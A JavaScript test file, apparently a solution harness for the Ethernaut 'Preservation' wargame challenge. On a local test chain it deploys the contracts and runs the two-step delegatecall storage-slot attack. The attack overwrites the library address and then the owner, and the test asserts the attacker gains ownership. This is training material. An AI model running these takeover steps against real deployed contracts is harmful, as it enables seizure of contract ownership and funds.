import { beforeEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { ethers } from "ethers";

const providerUrl = "http://127.0.0.1:8545";

const preservationArtifact = JSON.parse(
  await readFile(
    new URL(
      "../artifacts/contracts/Preservation.sol/Preservation.json",
      import.meta.url
    ),
    "utf8"
  )
);

const libraryArtifact = JSON.parse(
  await readFile(
    new URL(
      "../artifacts/contracts/Preservation.sol/LibraryContract.json",
      import.meta.url
    ),
    "utf8"
  )
);

const attackerArtifact = JSON.parse(
  await readFile(
    new URL(
      "../artifacts/contracts/PreservationAttacker.sol/PreservationAttacker.json",
      import.meta.url
    ),
    "utf8"
  )
);

describe("Ethernaut Challenge 16: Preservation", () => {
  let provider;
  let deployer;
  let attacker;
  let library1;
  let library2;
  let preservation;
  let preservationAttacker;

  beforeEach(async () => {
    provider = new ethers.JsonRpcProvider(providerUrl);
    deployer = await provider.getSigner(0);
    attacker = await provider.getSigner(1);

    const libraryFactory = new ethers.ContractFactory(
      libraryArtifact.abi,
      libraryArtifact.bytecode,
      deployer
    );

    library1 = await libraryFactory.deploy();
    await library1.waitForDeployment();

    library2 = await libraryFactory.deploy();
    await library2.waitForDeployment();

    const preservationFactory = new ethers.ContractFactory(
      preservationArtifact.abi,
      preservationArtifact.bytecode,
      deployer
    );

    preservation = await preservationFactory.deploy(
      await library1.getAddress(),
      await library2.getAddress()
    );
    await preservation.waitForDeployment();

    const attackerFactory = new ethers.ContractFactory(
      attackerArtifact.abi,
      attackerArtifact.bytecode,
      attacker
    );

    preservationAttacker = await attackerFactory.deploy();
    await preservationAttacker.waitForDeployment();
  });

  it("sets the deployer as the initial owner", async () => {
    assert.equal(
      await preservation.owner(),
      await deployer.getAddress()
    );
  });

  it("allows the attacker to overwrite the owner through delegatecall", async () => {
    const attackerContractAddress =
      await preservationAttacker.getAddress();

    // First call: overwrite timeZone1Library (storage slot 0).
    await (
      await preservation.connect(attacker).setFirstTime(
        BigInt(attackerContractAddress)
      )
    ).wait();

    assert.equal(
      await preservation.timeZone1Library(),
      attackerContractAddress
    );

    // Second call: delegatecall into PreservationAttacker.setTime().
    // Its owner variable occupies storage slot 2 in the target's context.
    const attackerAddress = await attacker.getAddress();

    await (
      await preservation.connect(attacker).setFirstTime(
        BigInt(attackerAddress)
      )
    ).wait();

    assert.equal(
      await preservation.owner(),
      attackerAddress
    );
  });

});

